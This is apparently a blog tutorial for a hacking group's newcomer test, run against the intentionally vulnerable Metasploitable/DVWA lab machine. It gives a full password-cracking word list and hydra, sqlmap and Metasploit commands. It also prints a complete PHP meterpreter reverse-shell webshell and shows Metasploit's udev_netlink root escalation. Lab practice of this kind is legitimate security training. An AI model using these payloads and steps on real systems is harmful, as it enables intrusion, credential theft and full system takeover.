# JianMu Newcomer Test Tutorial


**Note: The IP addresses in this article may differ from your actual situation!! Please modify the corresponding IP addresses based on your actual environment!!**

<!--more-->
## Opening Remarks

Ehehe~! I'm back again. I've seen many newcomers who don't know how to pass the JianMu newcomer test, so I wrote this blog post as a tutorial.

So you can read through it and pass...

Well... let's get started.

## Test Content

| Type | Content | Notes |
|:-:|:-|:-|
| Name | JianMu Four-Task Newcomer Assessment | The name of the test |
| Difficulty | Low | Difficulty level |
| Level 1 | Simple Web Form Cracking | Must pass, otherwise cannot proceed to the next level |
| Level 2 | Simple SQL Injection | Must pass |
| Level 3 | Operating System Penetration | Must pass |
| Level 4 | Obtain Root Privileges | Must pass |

**PS: The JianMu organization's newcomer assessment uses metasploitable as the standard, so I will explain how to prepare the environment.**

## Environment Preparation

As mentioned above, you'll need **metasploitable**. Next, I'll explain how to set up the target machine environment.

### Step 1 | Download & Extract

First, we need to download the metasploitable target machine virtual machine files. You can find it in various search engines, but I'll provide the address here.

[Click here to download](https://sourceforge.net/projects/metasploitable/)

Once you're there, click the big **Download** button to start downloading.

Well... I've already downloaded it. It's a **zip** file.

Then you need to extract it. Two methods:

* Linux
  * `unzip` command
  * file-roller (GUI)
* Windows
  * Various extraction software

I shouldn't need to explain this...

**You can't even extract a file and you want to join JianMu?**

![](/img/截图_2019-10-20_05-52-55.png)

After extraction, you can proceed to the next step.

### Step 2 | Create a Virtual Machine

When you open the folder, you'll see a virtual machine configuration file and a virtual hard disk file. It can be directly imported and run with VMware, so I'll provide the method for VirtualBox here.

First, open your VirtualBox.

![](/img/截图_2019-10-20_05-58-44.png)

Then click "New" at the top... (Do I really need to teach this?)

![](/img/截图_2019-10-20_05-59-53.png)

Then select the virtual machine type and OS version. **Important!! You must select "Other Linux (64-bit)" and set at least 256MB of memory! Otherwise, it won't start!**

![](/img/截图_2019-10-20_06-00-34.png)

![](/img/截图_2019-10-20_06-02-10.png)

Then **don't create a new virtual hard disk**. Instead, select **"Use an existing virtual hard disk file"**.

![](/img/截图_2019-10-20_06-04-29.png)

Click this button.

![](/img/截图_2019-10-20_06-05-21.png)

Then click **"Register"**.

![](/img/截图_2019-10-20_06-07-17.png)

Find your **metasploitable** directory and locate this **vmdk file**—that's the virtual hard disk file.

![](/img/截图_2019-10-20_06-08-57.png)

Click "Open", and you'll return to this window. Select the virtual hard disk you just registered.

![](/img/截图_2019-10-20_06-11-10.png)

Now you can create it.

![](/img/截图_2019-10-20_06-12-03.png)

**Before starting, change the virtual machine's network to bridged mode.**

**Go to Settings → Network**

Then this page will appear.

![](/img/截图_2019-10-20_06-16-46.png)

Change it to "Bridged Adapter".

![](/img/截图_2019-10-20_06-17-25.png)

Finally, start the virtual machine. Your target environment is now set up.

![](/img/截图_2019-10-20_06-12-40.png)
![](/img/截图_2019-10-20_06-18-39.png)

After booting, **don't touch the target machine** and **don't pay any attention to it**.

![](/img/截图_2019-10-20_06-19-35.png)

## The Assessment Process

Now that the environment is ready, we can start the challenges. Please **pay close attention! Pay close attention! Pay close attention!** (Important things said three times.)

### Sniffing! Scanning!

We've just set up the target machine but don't know its **IP address**, meaning we don't know **where it is**. So what do we do? We'll use **nmap** to scan for it.

First, you need to know your own IP subnet. My environment is a LAN with a DHCP range of `192.168.0.1/24`.

Run:

```bash
$ sudo nmap -v -O 192.168.0.1/24
```

![](/img/截图_2019-10-20_06-27-08.png)

It quickly finds it:

![](/img/截图_2019-10-20_06-31-32.png)

The information from the terminal is as follows, showing that 192.168.0.107 is the target machine's address:

```txt
Nmap scan report for 192.168.0.107
Host is up (0.00028s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=192 (Good luck!)
IP ID Sequence Generation: All zeros
```

Now I've found the target machine. Let the attack begin.

### Level 1 | Simple Web Form Cracking

Next, enter the IP address we just scanned in your browser to access the target machine's webpage.

![](/img/截图_2019-10-20_06-41-20.png)

> Newbie: "Huh? Why is your IP not 107 anymore, it changed to 4?"
>
> Answer: "I lost internet connection while writing this, so I set up a virtual LAN. The target machine's IP changed, and I had to scan again... But under normal circumstances, this IP won't change, so ignore whatever the specific address is—everyone's will be different."

Now click on **DVWA**. You'll see a login page asking for a username and password. Our goal for the first level is to crack it.

![](/img/截图_2019-10-20_06-45-23.png)

QwQ... And now you're probably confused, right?

#### Packet Capture

Well, remember **Burpsuite**?

It's a Java-based tool.

![](/img/截图_2019-10-20_06-51-38.png)

Want to give it a try?

Before using Burpsuite, you need to set the browser's proxy to Burp's. I'm using Firefox here.

In Burpsuite, click:

`Proxy (top left) → Options`

![](/img/截图_2019-10-20_06-56-54.png)

From here, we get Burp's default proxy address: `127.0.0.1:8080`

Next, set it up in your browser.

I'll just provide screenshots for brevity.

![](/img/截图_2019-10-20_07-02-05.png)

![](/img/截图_2019-10-20_07-03-59.png)

Then click OK, and it's set up.

Well... **if you can't even use a browser**, don't bother coming to JianMu.

Now go back to Burp and make sure **Intercept** is set to **on**. If it is, proceed to the next step. If not, click it...

![](/img/截图_2019-10-20_07-06-34.png)

Now, back to the browser.

![](/img/截图_2019-10-20_07-09-10.png)

Emmm... We know that the default admin account for most websites is **admin**, and it's no different here. Let's try entering `admin` in the **Username** field and whatever we want in the **Password** field.

![](/img/截图_2019-10-20_07-11-43.png)

Then click **Login**.

Now we've captured this packet. Below you can see the information I entered.

![](/img/截图_2019-10-20_07-13-04.png)

```http
POST /dvwa/login.php HTTP/1.1
Host: 192.168.0.4
User-Agent: Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Connection: close
Referer: http://192.168.0.4/dvwa/login.php
Cookie: security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be
Upgrade-Insecure-Requests: 1

username=admin&password=6666666666&Login=Login
```

Well... that's a lot to look at—it'll make you dizzy.

Ehehe~ Actually, you only need to save this part:

```txt
username=admin&password=6666666666&Login=Login
```

But that's not enough yet. We still need one more piece of information.

Now the webpage looks frozen, right?

Let me explain what the three buttons in Burp do:

* **Forward**: Let the packet through so the webpage continues executing
* **Drop**: Discard the packet, so the webpage won't execute

For now, click **Forward** to release this packet.

At this point, a string appeared at the bottom of the webpage.

![](/img/截图_2019-10-20_07-26-23.png)

Write it down—you'll need it later.

```txt
Login failed
```

Now turn off Burpsuite and disable the browser proxy. I won't go into detail on the steps.

Alright, the packet capture process is complete. Now it's time for **brute-forcing**.

#### Brute Forcing

Well... here comes the best part.

Do you know **hydra**? If not, go search for it with a search engine.

We need to set these parameters for hydra:

* `-l` + username: Sets the username we want to crack. We'll try `admin`.
* `-P` password dictionary: Specifies a txt file containing passwords to try.
* `-V`: Shows detailed output.
* `-e ns`: Try null password and login as password.
* IP address: The target's address, like `192.168.0.4` above.
* `http-post-form`: Specifies the bruteforce type, followed by the page address for the POST request.

Don't have a password dictionary? Here, I'll provide one. Just copy it into a txt file.

```txt
123456
12345
123456789
Password
iloveyou
princess
rockyou
1234567
12345678
abc123
admin888
admin123
test
password
123456
a123456
123456a
5201314
111111
woaini1314
qq123456
123123
0
1qaz2wsx
1q2w3e4r
qwe123
7758521
123qwe
a123123
123456aa
woaini520        
woaini
100200
1314520
woaini123
123321
q123456
123456789
123456789a
5211314
asd123
a123456789
z123456
asd123456
a5201314
aa123456
zhang123
aptx4869
123123a
1q2w3e4r5t
1qazxsw2
5201314a
1q2w3e
aini1314
31415926
q1w2e3r4
123456qq
woaini521
1234qwer
a111111
520520
iloveyou
abc123 
110110
111111a          
123456abc        
w123456
7758258
123qweasd
159753
qwer1234
a000000
qq123123
zxc123
123654
abc123456
123456q
qq5201314
12345678
000000a          
456852
as123456
1314521          
112233
521521
qazwsx123
zxc123456
abcd1234
asdasd
666666
love1314
QAZ123
aaa123
q1w2e3
aaaaaa
a123321
123000
11111111
12qwaszx
5845201314
s123456
nihao123
caonima123
zxcvbnm123
wang123
159357
1A2B3C4D
asdasd123
584520
753951
147258
1123581321
110120
qq1314520        
123456.com
123123
idc123!@#
123
aaa123!@#
qq123.com
123456
wantian##*(
qwe123
qwe1234
123qwe
123qwer
1qaz2wsx
1qaz
159753
!Q@W#E
159357
147369
1234567
password
aistar123<>!N
321
idcji2010
qqqqqq
1q2w3e
q1w2e3
336699
abc123
asd123
123654
1
111111
111
111qqq...
123456
953139.
0258
111qqq!!!
1236
qqii
tyinfo
abcd36888
rst_login
OAOidc
OAOidc123!@#
OAOidc123
esin888
qwer
power123
power.liu
power.yu
dns99+588
zhengui
idc0.1
7715123
sdwer
power.zhao
sdwer123
qwer1234
esincs
jspower123.0
5656789
2323456
power.com
power123.0
power0.123
jspower.com
123123
hlwj0519-1205.jf
123321
zaxscdvf
..0
!@#$QWER
95313
1231321
321123
vipnew
idc0514
1235698
235689
326598
112233
111222
qqqqqq
idc11
21vianet
#@!ewq
1010
111qqq
1234%^&*
12345^&*()
123456
4867086
1234567
123!@#
123456!@#
10000
794613
784512
895623
789456
456123
654321
123!@#
1234!@#$
11185
12345!@#$%
qwe123!@#
!@#123
!@#321
123#@!
19861212
19831212
19841020
#@!123
#@!321
idcidc
12345^&*()
!@#$%^&*()
)(*&^%$#@!
0987654321
tyidc
1122
111222
idc123
idcidcok
idcuser
abcd1234
1234abcd
caonima
1q2w3e4r
888888
admin!@#
abc!@#
!Q@W#E$R%T
idc2010
1236
1q2w3e4r5t
qqaazz
asdasd
admin
admin1
admin123
aaa111
111aaa
123aaa
lh222
lhidc
123a
a123
123456a
a123456
aaa123
qazwsx
qazxsw
0123
123112233
123111
www.7x24.cn
shisp.net
123000
idc0123
1230..
123456789
123456qwe
123qwe
12345qwert
zxcvbnm
qwerty
qweqwe
q1w2e3
123ewq
qwe321
1qazxsw2
12qwaszx
1234rewq
123456.com
lituobestsanmao
!@#19841010
msfadmin
19885510
xyidc_2006
95217189
95217
chinayixun
huachen1258zz
sanhe123
3H8IDC!!#
3H8IDC72sanhe000
xiaoyili
sanhe000~!@#  
3H8IDC!!#
ccfeng66131421  
!@#59560955
tkggja850518`1
zhengui
anada325!@#
www.txwscx.comsritgyxf2sxy19831122zx
ZHONGGUO$#@!999@
admin13906271234
395835961
senlinyan
3203672
9527999!!!
P@ssw0rd
huaiyukeji115
idc9aewr42
idc0.1
123asdasd
qsx6059410172.
idc0001
idc800888
idc46121
123asdasd
882627.8
luofei520!@#123
852799!!!
idc0123.0
513tyml.com
abc123!@#
1q2w3e,./? ><
6504710shuazuan
123.789+
123asdasd
752883855.
senlinyan$
admin001
6695zx
scictd9821622
365obsserver!
ranglm123456
13920225257
idc925111
1qaz@wsx#edc
.......199
xu15817079919
yanjin0429
zhangznw
13527380230
idc0.01
idc123&123
662766
122.224
huaiyukeji115
.......199@
liuzhangzi1988
123456!@#$%^
idc0123
dahouzi110
123.789+
trista188#**
mm1237
07736056123
TnHoo15862380404
idc0123
189532210113
idc123
gedingfeng1102888
```

And you need to combine the captured `username=admin&password=6666666666&Login=Login` and `Login failed` into this format:

```txt
username=^USER^&password=^PASS^&Login=Login:Login failed
```

Putting it all together, the command you need to execute is:

```bash
$ hydra -l admin -P ./passwords/pass-wake.txt -V -e ns 192.168.0.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

It will crack it quickly.

![](/img/截图_2019-10-20_07-49-15.png)

![](/img/截图_2019-10-20_07-50-18.png)

From the image above, we can see the password is `password`.

Now let's try to log in.

![](/img/截图_2019-10-20_07-51-58.png)

If the login is successful and you see this page, congratulations—you've passed the first level!

![](/img/截图_2019-10-20_07-54-11.png)

### Level 2 | Simple SQL Injection

After passing the first level, we need to see what's in its database.

#### Packet Capture

Go back to the webpage, enter `DVWA Security`, and change the security level to `Low`.

![](/img/截图_2019-11-03_13-11-42.png)

Then click the `SQL Injection` button to enter this page.

![](/img/截图_2019-11-03_12-55-19.png)

Now open Burp, and follow the same steps as before—monitoring, capturing packets, etc. (I explained this in detail above.)

With Burpsuite listening, enter something in this input field and click the `Submit` button. Burp will automatically capture the packet.

![](/img/截图_2019-11-03_13-12-22.png)

Save it as a txt file, but remember where it is. For example, mine is at `~/get.txt`.

![](/img/截图_2019-11-03_12-58-29.png)

The packet capture is done.

#### Using sqlmap for Injection

The tool we'll use is sqlmap. I'll only describe the injection process here. For a detailed tutorial, please refer to YouDi's videos.

Let's first scan for injection points:

```bash
$ sqlmap -r "get.txt"
```

![](/img/截图_2019-11-03_13-17-27.png)

![](/img/截图_2019-11-03_13-18-06.png)

Choose `y` for both of these.

![](/img/截图_2019-11-03_13-18-59.png)

For the last option, choose `n`—no need to waste time.

![](/img/截图_2019-11-03_13-19-51.png)

Next, we get the information we need—the database version, etc. Let me paste it here:

```txt
sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=6666666' OR NOT 1144=1144#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=6666666' OR ROW(6268,9799)>(SELECT COUNT(*),CONCAT(0x7162786b71,(SELECT (ELT(6268=6268,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM (SELECT 9569 UNION SELECT 7660 UNION SELECT 7717 UNION SELECT 8645)a GROUP BY x)-- dPXL&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=6666666' AND (SELECT 4811 FROM (SELECT(SLEEP(5)))hDuM)-- SMOw&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=6666666' UNION ALL SELECT NULL,CONCAT(0x7162786b71,0x794f4b67535851624375466379624550476a6243584e4b754d7250524e524d7a6c70587370704877,0x716a767071)#&Submit=Submit
---
[13:19:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 4.1
[13:19:30] [INFO] fetched data logged to text files under '/home/weepingdogel/.sqlmap/output/192.168.0.105'
```

Next, we need to look at the contents of the database. For brevity, I won't show the step-by-step navigation commands—I'll just dump it directly:

```bash
$ sqlmap -r "~/get.txt" --dump
```

![](/img/截图_2019-11-03_13-26-48.png)

There it is.

If your terminal outputs the following information, you've passed the second level:

```txt
Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                                    | last_name | first_name |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
| 1       | admin   | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
| 2       | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
| 3       | 1337    | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
| 4       | pablo   | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
| 5       | smithy  | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
```

### Level 3 | Operating System Penetration

Well,

Now it's time for the most critical part. We'll use a webshell to penetrate the target machine's operating system.

Do you know PHP? I don't know much about it either, but it can be uploaded to a server and executed like an executable file.

This time, we'll also use a PHP file as a **trojan** for the attack.

#### Generating the Trojan

We'll use the **`msfvenom`** command to generate it. Run:

```bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -o test.php
```

![](/img/截图_2019-11-03_13-35-25.png)

It's generated. Let's see what's inside:

```php
/*<?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

Just one line! That line is hehe... figure it out yourself.

Let's add some HTML to it:

```php
/*<?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();?>
<html>
<head>
<meta charset="utf-8" />
</head>
<body>
<h1>Hacked</h1>
</body>
</html>
```

Now go back to DVWA, click **`Upload`** in the bottom left corner to go to the upload page, then click **`Choose File`** and **`Upload`**.

Upload this file.

If you can't do this, I won't say much more—**you can't even upload a file and you want to join JianMu?**

![](/img/截图_2019-11-03_13-42-57.png)

Then we'll see something like this:

**`../../hackable/uploads/test.php succesfully uploaded!`**

This means the upload was successful. Next, we'll use **msf**.

Open msf in the terminal:

```bash
$ sudo msfconsole
```

I won't go into too much detail. Just follow the command flow—I've written about it before.

Load the module:

```bash
msf5 > use exploit/multi/handler
```

Execute in order:

```bash
msf5 exploit(multi/handler) > set lhost 192.168.0.106
```

```bash
msf5 exploit(multi/handler) > set lport 4444
```

```bash
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
```

```bash
msf5 exploit(multi/handler) > run
```

After executing, as shown:

![](/img/截图_2019-11-03_13-54-05.png)

Now go back to the browser and directly visit `http://192.168.0.105/dvwa/hackable/uploads/test.php`.

At this point, msf will receive the reverse connection, as shown:

![](/img/截图_2019-11-03_13-58-26.png)

![](/img/截图_2019-11-03_13-58-47.png)

As you can see, the permissions are pathetically low. But you've still passed the third level. We'll handle the permissions issue in the fourth level.

### Level 4 | Obtain Root Privileges

If you've made it this far, you're no longer a beginner. The last level: Privilege Escalation.

This is the most critical part. Let's get started.

First, put the webshell we just got into the background:

```
meterpreter > background
```

Then we'll use the module `exploit/linux/local/udev_netlink` (you can use others too, but I personally like this one).

```bash
msf5 exploit(multi/handler) > use exploit/linux/local/udev_netlink
```

You can enter the **`info`** command to view the module's details.

Then set the session number of the webshell we just had. Mine is 2:

```bash
msf5 exploit(linux/local/udev_netlink) > set SESSION 2
```

Finally, execute **`run`** or **`exploit`**:

```bash
msf5 exploit(linux/local/udev_netlink) > exploit
```

This will give us the highest level of privileges, as shown:

![](/img/截图_2019-11-03_14-07-51.png)

Let's check if the user is root:

```
meterpreter > getuid
```

Or:

```
meterpreter > shell
```

```
whoami
```

As shown:

![](/img/截图_2019-11-03_14-09-15.png)

Now you've passed the fourth level, and with it, the entire assessment. All that's left is to document evidence and submit screenshots to become a core member of JianMu.

---

## Conclusion

I wrote this over the course of a week, documenting as I went.

If you still can't do it after reading this... leave a comment below.

## Reference Links

* [ArchWiki](https://wiki.archlinux.org/index.php/Main_page_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))

* [Metasploitable Download](https://sourceforge.net/projects/metasploitable/)

* [YouDi's sqlmap Video](https://www.bilibili.com/video/av59729967)

---

**Note: Please indicate the source when reprinting. Do not use this blog to do anything reckless. Otherwise, you will bear the consequences yourself—it has nothing to do with me.**
